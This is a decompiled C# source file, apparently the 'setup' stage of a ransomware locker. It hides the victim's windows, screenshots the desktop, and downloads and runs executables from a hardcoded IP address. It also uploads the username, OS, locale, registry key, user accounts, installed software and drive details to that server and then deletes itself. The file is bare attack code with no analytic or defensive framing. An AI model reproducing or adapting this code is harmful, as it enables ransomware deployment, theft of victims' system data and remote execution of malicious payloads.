using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace setup;

internal class App
{
	public class FileInfo
	{
		public string Name;

		public string Filename = "file.bin";

		public string ContentType = "application/octet-stream";

		public byte[] Content;
	}

	private const string GateIP = "91.92.128.152";

	private const string APIUrl = "http://91.92.128.152/upload";

	private const string FilesUrl = "http://91.92.128.152/files/";

	private static string AppName = "";

	private static string ScreenSaverName = "screensaver.exe";

	private static string ScreenSaverArgs = "7C28913B6F1CE6E452678F117954BF4EJ7521E2B4A224740AAF64D5FAD08520ACDF9F8912E7DE";

	public static void Start(string[] args)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Invalid comparison between Unknown and I4
		DetectAppName();
		if ((int)MessageBox.Show("REALLY RUN LOCKER????", AppName, (MessageBoxButtons)4) == 7)
		{
			Environment.Exit(0);
			return;
		}
		if (!Runner.CheckSingle())
		{
			Environment.Exit(0);
		}
		Runner.HideAllWindows();
		FileInfo[] files = new FileInfo[1]
		{
			new FileInfo
			{
				Name = "desktop",
				Content = ScreenShot.MakeDesktopScreenshot()
			}
		};
		DownloadAndRun(AppName + ".exe");
		UploadDedInfo(files, FullInfo());
		DownloadAndRun(ScreenSaverName, ScreenSaverArgs, Confirm: false);
		Runner.SelfRemove();
	}

	private static void DetectAppName()
	{
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());
		if (fileNameWithoutExtension.Contains("_"))
		{
			AppName = fileNameWithoutExtension.Split(new char[1] { '_' })[1].Trim();
		}
		else
		{
			MessageBox.Show("MUST BE like setup_appname.exe");
		}
	}

	private static void DownloadAndRun(string ExeName, string Args = "", bool Confirm = true)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Invalid comparison between Unknown and I4
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Invalid comparison between Unknown and I4
		using WebClient webClient = new WebClient();
		bool flag = true;
		while (flag)
		{
			try
			{
				webClient.DownloadFile(new Uri("http://91.92.128.152/files/" + ExeName), ExeName);
				if (Confirm || (int)MessageBox.Show("Start " + ExeName + "?", ExeName, (MessageBoxButtons)4) == 6)
				{
					Process.Start(ExeName, Args);
				}
				break;
			}
			catch (Exception ex)
			{
				if ((int)MessageBox.Show(ex.Message + "\r\nTry now??", "Download and run " + ExeName + " error", (MessageBoxButtons)4) == 7)
				{
					Runner.SelfRemove();
					flag = false;
				}
			}
		}
	}

	private static void UploadDedInfo(FileInfo[] Files, NameValueCollection Info)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Invalid comparison between Unknown and I4
		bool flag = true;
		while (flag)
		{
			try
			{
				UploadFiles("http://91.92.128.152/upload", Files, Info);
				break;
			}
			catch (Exception ex)
			{
				if ((int)MessageBox.Show(ex.Message + "\r\nRETRY SEND??", "UPLOAD ERROR", (MessageBoxButtons)4) == 7)
				{
					Runner.SelfRemove();
					flag = false;
				}
			}
		}
	}

	private static NameValueCollection FullInfo()
	{
		return new NameValueCollection
		{
			{
				"login",
				Environment.UserName
			},
			{
				"os",
				OSInfo.GetOSName()
			},
			{
				"language",
				OSInfo.GetOSLang()
			},
			{
				"timezone",
				OSInfo.GetTimeZone()
			},
			{
				"key",
				OSInfo.LBRegID()
			},
			{
				"keyboards",
				string.Join("\r\n", OSInfo.GetKeyboards())
			},
			{
				"users",
				string.Join("\r\n", OSInfo.GetUsers())
			},
			{
				"soft",
				string.Join("\r\n", OSInfo.GetInstalledSoft())
			},
			{
				"drives",
				string.Join("\r\n", OSInfo.GetDrivesInfo())
			},
			{ "sender", AppName }
		};
	}

	public static void UploadFiles(string address, IEnumerable<FileInfo> files, NameValueCollection values)
	{
		WebRequest webRequest = WebRequest.Create(address);
		webRequest.Method = "POST";
		string text = "---------------------------" + DateTime.Now.Ticks.ToString("x", NumberFormatInfo.InvariantInfo);
		webRequest.ContentType = "multipart/form-data; boundary=" + text;
		text = "--" + text;
		using (Stream stream = webRequest.GetRequestStream())
		{
			foreach (string key in values.Keys)
			{
				byte[] bytes = Encoding.ASCII.GetBytes(text + Environment.NewLine);
				stream.Write(bytes, 0, bytes.Length);
				bytes = Encoding.ASCII.GetBytes(string.Format("Content-Disposition: form-data; name=\"{0}\"{1}{1}", key, Environment.NewLine));
				stream.Write(bytes, 0, bytes.Length);
				bytes = Encoding.UTF8.GetBytes(values[key] + Environment.NewLine);
				stream.Write(bytes, 0, bytes.Length);
			}
			foreach (FileInfo file in files)
			{
				byte[] bytes2 = Encoding.ASCII.GetBytes(text + Environment.NewLine);
				stream.Write(bytes2, 0, bytes2.Length);
				bytes2 = Encoding.UTF8.GetBytes($"Content-Disposition: form-data; name=\"{file.Name}\"; filename=\"{file.Filename}\"{Environment.NewLine}");
				stream.Write(bytes2, 0, bytes2.Length);
				bytes2 = Encoding.ASCII.GetBytes(string.Format("Content-Type: {0}{1}{1}", file.ContentType, Environment.NewLine));
				stream.Write(bytes2, 0, bytes2.Length);
				stream.Write(file.Content, 0, file.Content.Length);
				bytes2 = Encoding.ASCII.GetBytes(Environment.NewLine);
				stream.Write(bytes2, 0, bytes2.Length);
			}
			byte[] bytes3 = Encoding.ASCII.GetBytes(text + "--");
			stream.Write(bytes3, 0, bytes3.Length);
		}
		webRequest.GetResponse().Close();
	}
}
